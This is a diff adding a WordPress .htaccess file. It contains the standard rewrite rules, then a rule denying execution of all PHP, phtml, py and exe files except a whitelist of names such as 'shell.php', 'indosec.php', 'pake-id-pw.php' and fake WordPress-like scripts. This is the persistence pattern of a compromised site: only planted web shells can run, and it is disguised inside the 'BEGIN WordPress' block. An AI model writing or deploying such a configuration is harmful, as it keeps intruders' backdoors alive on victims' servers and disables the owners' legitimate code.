@@ -1,0 +1,26 @@
+RewriteOptions inherit
+
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+<FilesMatch ".*\.(py|exe|EXE|Exe|EXe|ExE|eXE|eXe|exE|phtml|PHTML|Phtml|PhTml|PhtMl|PhtmL|pHtml|pHtml|phTml|phtMl|phtmL|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php7|PHP5|Php5|PHp5|pHp5|pHP5|phP5|PhP5|PHP7|Php7|PHp7|pHp7|pHP7|phP7|PhP7|php8|PHP8|Php8|PHp8|pHp8|pHP8|phP8|PhP8|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|wp-login.php|wp-admin.php|wp-blog-activated.php|wp-blog-activate.php|wp-mail-activated.php|wp-loadscript.php|wp-reload.php|wp-high-post.php|wp-blog-reload.php|wp-log-style.php|class-wp-reload.php|wp-signin.php|wp-sample-config.php|class-wp-rest-comment.php|wp-rules.php|anti-male.php|pake-id-pw.php|blogs.php|indosec.php|wp-blog.php|wow.php|preciseurl.php|shell.php|)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
+# END WordPress
